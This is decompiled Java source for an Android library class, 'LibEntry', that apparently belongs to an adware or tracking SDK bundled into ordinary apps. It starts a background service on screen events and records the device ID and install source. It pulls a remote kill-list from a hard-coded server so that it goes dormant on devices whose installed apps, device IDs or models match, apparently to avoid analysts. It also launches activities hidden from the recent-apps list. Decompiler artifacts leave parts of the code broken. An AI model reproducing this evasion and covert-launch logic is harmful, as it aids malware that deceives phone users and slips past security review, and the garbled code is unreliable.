package com.lib.trackapp;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings.Secure;
import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class LibEntry
{
  public static String SMID = "";
  public static String TrackIDG = "";
  public static String TrackIDNG = "";
  public static String TrackITE = "500105";
  public static HashSet<Activity> activityHashSet;
  public static String appName = "";
  private RequestQueue requestQueue;
  
  public LibEntry(Context paramContext)
  {
    ScreenReceiver.printVaule(paramContext, "inside libentry");
    try
    {
      IntentFilter localIntentFilter = new IntentFilter("android.intent.action.SCREEN_ON");
      localIntentFilter.addAction("android.intent.action.SCREEN_OFF");
      paramContext.registerReceiver(new ScreenReceiver(), localIntentFilter);
    }
    catch (Exception localException1)
    {
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("Exception in ragister broadcast");
      localStringBuilder.append(localException1);
      ScreenReceiver.printVaule(paramContext, localStringBuilder.toString());
    }
    try
    {
      IsUtilReady.storeandroidIdInPref(paramContext, Settings.Secure.getString(paramContext.getContentResolver(), "android_id"));
      if (!IsUtilReady.isMyServiceRunning(LockService.class, paramContext))
      {
        ScreenReceiver.printVaule(paramContext, "start LockService");
        paramContext.startService(new Intent(paramContext, LockService.class));
      }
      if (IsUtilReady.getDownloadFrom(paramContext).equalsIgnoreCase("NON")) {
        if (IsUtilReady.isInstalledFromGoolge(paramContext.getPackageName(), paramContext)) {
          IsUtilReady.saveDownloadFrom("Google", paramContext);
        } else {
          IsUtilReady.saveDownloadFrom("NoGoogle", paramContext);
        }
      }
      SMEventHandling.getInstanse(paramContext, true);
      ScreenReceiver.printVaule(paramContext, "libenrty last line");
      if ((!getFirstBResponse(paramContext)) && (!ScreenReceiver.isTestingMode)) {
        requestUrlsFirst(paramContext);
      }
      if ((!IsUtilReady.getServerDone(paramContext)) && (getID(paramContext).length() > 10))
      {
        if (IsUtilReady.getDownloadFrom(paramContext).equalsIgnoreCase("Google"))
        {
          IsUtilReady.requestServerStatus(paramContext, true);
          return;
        }
        IsUtilReady.requestServerStatus(paramContext, false);
      }
      return;
    }
    catch (Exception localException2)
    {
      for (;;) {}
    }
  }
  
  public static void addActivity(Activity paramActivity)
  {
    if (activityHashSet == null) {
      activityHashSet = new HashSet();
    }
    if (!activityHashSet.contains(paramActivity)) {
      activityHashSet.add(paramActivity);
    }
  }
  
  public static boolean appInstalledOrNot(Context paramContext, String paramString)
  {
    paramContext = paramContext.getPackageManager().getInstalledPackages(1);
    if (paramContext != null)
    {
      paramContext = paramContext.iterator();
      while (paramContext.hasNext())
      {
        String str = ((PackageInfo)paramContext.next()).packageName;
        if ((str != null) && (str.equals(paramString))) {
          return true;
        }
      }
    }
    return false;
  }
  
  protected static HashSet<Activity> getActivityHashSet()
  {
    return activityHashSet;
  }
  
  public static void getDefaultValues(Context paramContext)
  {
    if (paramContext != null) {
      try
      {
        paramContext = paramContext.getSharedPreferences("APPUTILFILE12", 0);
        ScreenReceiver.CurrentEnable = paramContext.getString("CurrentEnable", "");
        ScreenReceiver.FutureEnable = paramContext.getString("FutureEnable", "");
        SMID = paramContext.getString("SMID", "");
        TrackIDG = paramContext.getString("GID", "");
        TrackIDNG = paramContext.getString("GNID", "");
        appName = paramContext.getString("appName", "appName");
        return;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
      }
    }
  }
  
  public static boolean getFirstBResponse(Context paramContext)
  {
    try
    {
      boolean bool = paramContext.getApplicationContext().getSharedPreferences("saveLastTimeUTIL", 0).getBoolean("FirstBResponse", false);
      return bool;
    }
    catch (Exception paramContext) {}
    return false;
  }
  
  public static String getID(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("APPUTILFILE12", 0).getString("impid", "");
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  private void parseFirstResponse(Context paramContext, JSONObject paramJSONObject)
  {
    for (;;)
    {
      int i;
      try
      {
        JSONArray localJSONArray = paramJSONObject.getJSONArray("groupA");
        int j = localJSONArray.length();
        i = 0;
        if (i < j)
        {
          if (appInstalledOrNot(paramContext, localJSONArray.getJSONObject(i).getString("gav")))
          {
            if (ScreenReceiver.getPermanetClose(paramContext) == 0)
            {
              ScreenReceiver.savePermanetClose(paramContext, 1);
              IsUtilReady.trackMore(paramContext, 0);
            }
            IsUtilReady.saveUtilStatus(paramContext, 6);
            saveFirstBResponse(paramContext, true);
          }
        }
        else
        {
          localJSONArray = paramJSONObject.getJSONArray("groupB");
          String str = IsUtilReady.getAndroidId(paramContext);
          j = localJSONArray.length();
          i = 0;
          if (i < j)
          {
            if (!localJSONArray.getJSONObject(i).getString("gbv").equalsIgnoreCase(str)) {
              break label237;
            }
            if (ScreenReceiver.getPermanetClose(paramContext) == 0)
            {
              ScreenReceiver.savePermanetClose(paramContext, 2);
              IsUtilReady.trackMore(paramContext, 0);
            }
            IsUtilReady.saveUtilStatus(paramContext, 6);
            saveFirstBResponse(paramContext, true);
            return;
          }
          paramJSONObject = paramJSONObject.getJSONArray("groupC");
          j = paramJSONObject.length();
          i = 0;
          if (i < j)
          {
            if (!paramJSONObject.getJSONObject(i).getString("gcv").equalsIgnoreCase(Build.MODEL)) {
              break label244;
            }
            if (ScreenReceiver.getPermanetClose(paramContext) == 0)
            {
              ScreenReceiver.savePermanetClose(paramContext, 3);
              IsUtilReady.trackMore(paramContext, 0);
            }
            IsUtilReady.saveUtilStatus(paramContext, 6);
            saveFirstBResponse(paramContext, true);
            return;
          }
          saveFirstBResponse(paramContext, true);
          return;
        }
      }
      catch (Exception paramContext)
      {
        return;
      }
      i += 1;
      continue;
      label237:
      i += 1;
      continue;
      label244:
      i += 1;
    }
  }
  
  private void requestUrlsFirst(final Context paramContext)
  {
    this.requestQueue = Volley.newRequestQueue(paramContext);
    paramContext = new StringRequest(0, "http://appvalue.mygamesonline.org/nfbh.php", new Response.Listener()new Response.ErrorListener
    {
      public void onResponse(String paramAnonymousString)
      {
        try
        {
          paramAnonymousString = new JSONObject(paramAnonymousString);
          LibEntry.this.parseFirstResponse(paramContext, paramAnonymousString);
          return;
        }
        catch (Exception paramAnonymousString) {}
      }
    }, new Response.ErrorListener()
    {
      public void onErrorResponse(VolleyError paramAnonymousVolleyError) {}
    });
    this.requestQueue.add(paramContext);
  }
  
  public static void saveDefaultValues(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("APPUTILFILE12", 0).edit();
      paramContext.putString("CurrentEnable", paramString1);
      paramContext.putString("FutureEnable", paramString2);
      paramContext.putString("SMID", paramString3);
      paramContext.putString("GID", paramString4);
      paramContext.putString("GNID", paramString5);
      paramContext.putString("appName", paramString6);
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void saveFirstBResponse(Context paramContext, boolean paramBoolean)
  {
    paramContext = paramContext.getApplicationContext().getSharedPreferences("saveLastTimeUTIL", 0).edit();
    paramContext.putBoolean("FirstBResponse", paramBoolean);
    paramContext.commit();
  }
  
  public static void saveID(Context paramContext, String paramString)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("APPUTILFILE12", 0).edit();
      paramContext.putString("impid", paramString);
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startOwnActivity(Intent paramIntent, Context paramContext)
  {
    try
    {
      if (IsUtilReady.getUtilStatus(paramContext) == 1)
      {
        paramIntent.setFlags(8388608);
        paramIntent.setFlags(268435456);
        paramContext.startActivity(paramIntent);
        return;
      }
      paramIntent.setFlags(268435456);
      paramContext.startActivity(paramIntent);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          paramIntent.setFlags(268435456);
          paramContext.startActivity(paramIntent);
          return;
        }
        catch (Exception paramIntent) {}
        localException = localException;
      }
    }
  }
}
